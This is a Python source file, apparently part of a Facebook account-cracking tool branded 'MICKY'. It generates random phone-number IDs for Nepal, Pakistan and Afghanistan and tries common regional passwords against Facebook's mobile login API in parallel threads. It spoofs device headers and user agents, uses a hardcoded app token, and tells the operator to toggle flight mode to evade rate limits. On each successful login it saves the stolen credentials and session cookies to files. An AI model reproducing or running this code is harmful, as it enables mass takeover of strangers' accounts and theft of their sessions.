		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(6))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [uid,psx,uid[:8],uid[:7],uid[:6],'nepal123','nepal12345','nepal@123','magar','magar123','maya','maya123','pokhara','kumari','kathmandu','kathmandu123','tamang123','tamang']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
		
#__________________| PAKISTAN |__________________#
def pakistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 0306 | 0335 | 0315 | 0345 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122,''jutti123']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| AFGHANISTAN |__________________#
def afghanistan():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()		
#__________________| FILE METHOD M1 |__________________#
def api1(ids,names,passlist):
        try:
                global oks,loop,sim_id,device
                sys.stdout.write(f'\r\r{G}[{R}MICKY-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/302.0.0.45.119;FBBV/268946186;FBDM/{density=2'+'.0,width='+'720,height='+'1569};FBLC/en_US;FBRV/269803905;FBCR/Marshmallow;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M426B;FBSV/13;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        quality = random.choice(['POOR', 'MODERATE', 'GOOD', 'EXCELLENT'])
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'samsung',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '302.0.0.45.119',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'User-Agent': ua,
                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'keep-alive',
                                'Host': 'graph.facebook.com',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Priority': 'u=3, i',
                                'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
                                'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
                                'X-Fb-Connection-Quality': 'GOOD',
                                'Zero-Rated': '0', 
                                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                                'X-Fb-Connection-Type': 'MOBILE.LTE', 
                                'X-Fb-Device-Group': '5120',
                                'X-Tigon-Is-Retry': 'False',
                                'X-Fb-Friendly-Name': 'authenticate',
                                'X-Fb-Request-Analytics-Tags': 'unknown', 
                                'X-Fb-Http-Engine': 'Liger',
                                'X-Fb-Client-Ip': 'True', 
                                'X-Fb-Server-Cluster': 'True',
                                'Content-Length': str(random.randint(600, 1000)),}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}MICKY-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MICKY-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}MICKY-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MICKY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| FILE METHOD M2 |__________________#
def api2(ids,names,passlist):
        try:
                global oks,loop,sim_id
                sys.stdout.write(f'\r\r{G}[{R}MICKY-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "sim_country": "id",
                                "network_country": "id",
                                "enroll_misauth": "false",
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                "cpl": "true",
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}MICKY-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MICKY-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}MICKY-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MICKY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}MICKY-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        #mula = random.choice(["MT7-TL10", "MT7-TL00", "MT7-L09", "MT7-CL00", "MT7-UL00", "MT7-J1"])
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/ 187.0.0.34.81;FBBV/122154270;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/en_US;FBRV/154662184;FBCR/Marshmallow;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-Z910F;FBSV/5.0.2;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        device_id = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'Motorola',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '187.0.0.34.81',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}MICKY-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MICKY-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}MICKY-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MICKY-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}MICKY-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/210.0.0.25.119;FBBV/143124725;FBDM/{density=2'+'.0,width='+'720,height='+'1280};FBLC/en_GB;FBRV/144993902;FBCR/Nepal Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T255S;FBSV/4.0.3;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'samsung',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '210.0.0.25.119',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}MICKY-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MICKY-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MICKY-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}MICKY-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,300)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022716;FBDM/{density=3'+'.0,width='+'1080,height='+'2340};FBLC/en_NP;FBRV/35934039;FBCR/Smartfren;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M1903F11I;FBSV/9;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':uid,
                                'password':pas,
                                "logged_out_id": str(uuid.uuid4()),
                                "hash_id": str(uuid.uuid4()),
                                "reg_instance": str(uuid.uuid4()),
                                "session_id": str(uuid.uuid4()),
                                "advertiser_id": str(uuid.uuid4()),
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'device': 'Xiaomi',
                                "sim_country": "id",
                                "network_country": "id",
                                'app_version': '86.0.0.19.69',
                                "relative_url": "method/auth.login",
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}MICKY-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        open('/sdcard/MICKY-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}MICKY-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MICKY-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| END |__________________#
if __name__ == '__main__':

    menu()
